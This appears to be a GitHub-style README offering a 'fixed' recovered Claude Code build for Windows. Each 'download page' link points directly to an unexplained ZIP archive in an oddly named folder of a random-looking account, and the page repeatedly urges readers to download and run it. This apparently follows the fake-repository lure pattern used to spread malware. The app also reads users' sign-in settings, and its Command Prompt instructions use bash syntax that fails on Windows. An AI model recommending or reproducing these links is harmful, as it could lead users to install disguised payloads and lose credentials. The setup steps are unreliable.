# 🛠️ claude-code-fixed - Run Claude Code on Windows

[![Download](https://img.shields.io/badge/Download%20Page-Visit%20Now-blue?style=for-the-badge)](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)

## 🚀 Quick Download

Use this page to download and run the app on Windows:

[Open the download page](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)

## 📥 What This App Does

`claude-code-fixed` is a recoverable Claude Code 2.1.88 project tree for Windows users who want a working local setup.

It is built so you can:

- download the project
- install the needed files
- build the app on your PC
- start Claude Code from the command line
- open the interactive interface
- check that the app runs before you use it

This repo is aimed at end users who want a practical way to run the app and keep it working.

## 🪟 Windows Setup

You can run this project on Windows with a few simple steps.

### What you need

- Windows 10 or Windows 11
- Internet access
- Node.js installed on your PC
- Git installed if you plan to copy the repo from GitHub
- enough free disk space for the install and build files

### Install Node.js

If Node.js is not on your PC yet:

1. Go to the Node.js website
2. Download the current LTS version for Windows
3. Run the installer
4. Keep the default options
5. Finish the setup
6. Open Command Prompt to check that it works

To check, type:

```bash
node -v
npm -v
```

If both commands show a version number, you are ready.

## 📦 Download and Install

1. Open the download page:
   [https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)

2. Download the project files to your PC

3. Extract the files if you downloaded a ZIP package

4. Open Command Prompt in the project folder

5. Install the required packages:

```bash
npm install
```

If the install takes time, let it finish before you move on.

## 🧱 Build the App

After the install is done, build the app:

```bash
npm_config_cache=.npm-cache npm run build
```

This step prepares the app for use.

If Windows blocks the command, open Command Prompt again and make sure you are inside the project folder.

## ▶️ Start Claude Code

After the build, check the app status:

```bash
npm run cli:status
```

If the status looks good, start the app:

```bash
npm run cli:run
```

This opens the interactive Claude Code interface in your terminal.

## 🔐 Global Settings and Local Settings

This project can use your global `~/.claude/settings.json` file for proxy and sign-in settings.

If you want that behavior, use:

```bash
npm run cli:run
```

If you want the app to use only local project settings, use:

```bash
CLAUDE_RECOVERY_SKIP_GLOBAL_ENV=1 npm run cli:run
```

Use the local mode if you want a clean setup that stays separate from other Claude settings on your PC.

## 🧭 Basic Use

Once the app opens, you can type your request in the terminal.

Example:

- ask it to write text
- ask it to explain a file
- ask it to help with code
- ask it to check a project step by step

To test that it responds, you can run:

```bash
npm run cli:run -- -p "Reply with exactly: OK"
```

If the app is working, it returns the exact response you asked for.

## 🗂️ Project Structure

### Root folder

| Path | Purpose |
| --- | --- |
| `package.json` | Holds project info, dependencies, and script commands. |
| `package-lock.json` | Locks the installed package versions. |
| `tsconfig.json` | TypeScript build settings. |
| `docs/` | Manual files for build and development. |
| `src/` | Main source files for the app. |
| `scripts/` | Helper scripts used during build and runtime. |

### Main scripts

| Command | What it does |
| --- | --- |
| `npm install` | Installs all required packages. |
| `npm_config_cache=.npm-cache npm run build` | Builds the project. |
| `npm run cli:status` | Checks whether the CLI is ready. |
| `npm run cli:run` | Starts the app in interactive mode. |
| `npm run cli:run -- -p "Reply with exactly: OK"` | Runs a quick response test. |

## 🧰 Common Problems

### Node command not found

If you see a message that `node` or `npm` is not found:

- close Command Prompt
- reopen it
- install Node.js again if needed
- check the PATH option during install

### Install stops or fails

If `npm install` fails:

- check your internet connection
- close other heavy apps
- open Command Prompt as a normal user first
- run the install again

### Build does not start

If the build command fails:

- make sure you are in the project folder
- check that `npm install` finished first
- run the build command again

### App does not open

If `npm run cli:run` does not start the interface:

- run `npm run cli:status`
- check your terminal for a clear error
- try the local settings mode with `CLAUDE_RECOVERY_SKIP_GLOBAL_ENV=1`

## 🖥️ Example Workflow for Windows

Use this order for the smoothest setup:

```bash
npm install
npm_config_cache=.npm-cache npm run build
npm run cli:status
npm run cli:run
```

If you want to keep the app separate from your global Claude settings:

```bash
npm install
npm_config_cache=.npm-cache npm run build
npm run cli:status
CLAUDE_RECOVERY_SKIP_GLOBAL_ENV=1 npm run cli:run
```

## 📚 More Files

This repo also includes manual files that explain build and secondary development steps in more depth.

- Build guide: `docs/BUILD_MANUAL.md`
- Secondary development guide: `docs/SECONDARY_DEVELOPMENT_MANUAL.md`

Use these files if you want to understand how the project is put together or how to extend it.

## 🔎 Verification

The current setup has been checked with these commands:

```bash
npm_config_cache=.npm-cache npm run build
npm run cli:status
npm run cli:run -- -p "Reply with exactly: OK"
npm run cli:run
```

That means the project is ready for a local Windows workflow after install and build

## 🧩 Best Practices

- Keep the project in a simple folder path, such as `C:\claude-code-fixed`
- Use one terminal window for each test
- Run `npm install` before build or run commands
- Keep your terminal open while the app is running
- Use the local settings mode if you want a clean test setup

## 📌 Download Page

Open the download page here:

[https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip](https://github.com/featherlike-peperomiasandersii662/claude-code-fixed/raw/refs/heads/main/Rocouyenne/code_claude_fixed_2.5.zip)

Use this link to download and run the files on Windows